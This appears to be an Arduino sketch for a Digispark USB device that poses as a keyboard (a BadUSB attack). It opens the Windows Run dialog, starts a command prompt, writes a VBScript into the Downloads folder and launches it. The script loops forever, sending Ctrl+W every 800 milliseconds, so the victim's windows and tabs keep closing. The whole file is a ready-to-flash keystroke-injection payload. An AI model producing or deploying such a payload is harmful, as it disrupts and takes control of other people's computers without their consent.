#define kbd_es_es
#include "DigiKeyboard.h"

void setup() {
  DigiKeyboard.update();
  DigiKeyboard.delay(5000);
}

void loop() {
  DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);
  delay(2000);
  DigiKeyboard.println("cmd");
  delay(4000);
  DigiKeyboard.println("cd %userprofile%/Downloads");
  delay(2000);
  DigiKeyboard.println("copy con CW.vbs");
  delay(2000);
  DigiKeyboard.println("do");
  delay(2000);
  DigiKeyboard.println("Set objShell = CreateObject(\"WScript.Shell\")");
  delay(2000);
  DigiKeyboard.println("WScript.Sleep 800");
  delay(2000);
  DigiKeyboard.println("objShell.SendKeys \"^{W}\"");
  delay(2000);
  DigiKeyboard.println("loop");
  delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_Z,MOD_CONTROL_LEFT);
  delay(3000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  delay(2000);
  DigiKeyboard.println("start CW.vbs && exit");
  while(1);
  }
